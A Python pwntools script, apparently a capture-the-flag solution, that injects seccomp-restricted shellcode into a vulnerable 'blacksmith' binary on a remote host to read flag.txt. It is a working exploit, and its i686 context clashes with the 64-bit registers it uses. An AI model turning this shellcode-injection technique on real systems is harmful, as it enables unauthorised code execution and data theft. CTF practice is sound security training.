from pwn import *

context(arch="i686", os="linux")

LOCAL = False
elf = context.binary = ELF('./blacksmith', checksec=False)
if LOCAL:
	p = elf.process()
else:
	p = remote('206.189.121.131', '30551')

'''
checksec output: 
	NX:       NX disabled
Looking at ghidra, we find out that in shield() function, the program acctually execute our payload:
	write(1,"Do you like your new weapon?\n> ",__n);
	read(0,local_58,0x3f); 								# only 63 bytes will be taken
  	(*(code *)local_58)();

The problem is that:
	payload = asm(shellcraft.cat('flag.txt'))
failed.

See attached image (seccomp dump.png) - we can only use: read, write, open, exit.
'''

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "2")

payload  = asm(shellcraft.open('flag.txt'))
payload += asm(shellcraft.read(3, 'rsp', 0x30))
payload += asm(shellcraft.write(1, 'rsi', 'rax'))

p.sendlineafter("> ", payload)

success(p.recv())